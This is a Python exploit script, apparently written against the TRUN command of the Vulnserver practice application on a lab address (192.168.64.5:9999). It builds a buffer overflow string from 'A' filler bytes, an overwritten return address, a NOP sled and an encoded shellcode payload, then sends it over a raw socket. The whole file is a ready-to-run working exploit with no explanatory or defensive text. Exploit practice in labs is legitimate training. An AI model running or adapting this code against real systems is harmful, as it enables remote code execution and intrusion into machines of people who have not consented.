import socket
import sys

overflow_payload = ("\xbd\xf8\xa4\x9a\xe8\xdd\xc7\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x52\x31\x6a\x12\x03\x6a\x12\x83\x3a\xa0\x78\x1d\x46"
"\x41\xfe\xde\xb6\x92\x9f\x57\x53\xa3\x9f\x0c\x10\x94\x2f"
"\x46\x74\x19\xdb\x0a\x6c\xaa\xa9\x82\x83\x1b\x07\xf5\xaa"
"\x9c\x34\xc5\xad\x1e\x47\x1a\x0d\x1e\x88\x6f\x4c\x67\xf5"
"\x82\x1c\x30\x71\x30\xb0\x35\xcf\x89\x3b\x05\xc1\x89\xd8"
"\xde\xe0\xb8\x4f\x54\xbb\x1a\x6e\xb9\xb7\x12\x68\xde\xf2"
"\xed\x03\x14\x88\xef\xc5\x64\x71\x43\x28\x49\x80\x9d\x6d"
"\x6e\x7b\xe8\x87\x8c\x06\xeb\x5c\xee\xdc\x7e\x46\x48\x96"
"\xd9\xa2\x68\x7b\xbf\x21\x66\x30\xcb\x6d\x6b\xc7\x18\x06"
"\x97\x4c\x9f\xc8\x11\x16\x84\xcc\x7a\xcc\xa5\x55\x27\xa3"
"\xda\x85\x88\x1c\x7f\xce\x25\x48\xf2\x8d\x21\xbd\x3f\x2d"
"\xb2\xa9\x48\x5e\x80\x76\xe3\xc8\xa8\xff\x2d\x0f\xce\xd5"
"\x8a\x9f\x31\xd6\xea\xb6\xf5\x82\xba\xa0\xdc\xaa\x50\x30"
"\xe0\x7e\xf6\x60\x4e\xd1\xb7\xd0\x2e\x81\x5f\x3a\xa1\xfe"
"\x40\x45\x6b\x97\xeb\xbc\xfc\x58\x43\xfe\xfb\x30\x96\xfe"
"\x12\x9d\x1f\x18\x7e\x0d\x76\xb3\x17\xb4\xd3\x4f\x89\x39"
"\xce\x2a\x89\xb2\xfd\xcb\x44\x33\x8b\xdf\x31\xb3\xc6\xbd"
"\x94\xcc\xfc\xa9\x7b\x5e\x9b\x29\xf5\x43\x34\x7e\x52\xb5"
"\x4d\xea\x4e\xec\xe7\x08\x93\x68\xcf\x88\x48\x49\xce\x11"
"\x1c\xf5\xf4\x01\xd8\xf6\xb0\x75\xb4\xa0\x6e\x23\x72\x1b"
"\xc1\x9d\x2c\xf0\x8b\x49\xa8\x3a\x0c\x0f\xb5\x16\xfa\xef"
"\x04\xcf\xbb\x10\xa8\x87\x4b\x69\xd4\x37\xb3\xa0\x5c\x57"
"\x56\x60\xa9\xf0\xcf\xe1\x10\x9d\xef\xdc\x57\x98\x73\xd4"
"\x27\x5f\x6b\x9d\x22\x1b\x2b\x4e\x5f\x34\xde\x70\xcc\x35"
"\xcb")
stringToSend = ("TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow_payload)

try:
    connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connection.connect(("192.168.64.5",9999))
    bytes = stringToSend.encode("latin1")
    connection.send(bytes)
    connection.close()

except Exception as e:
    print(e)
    sys.exit()
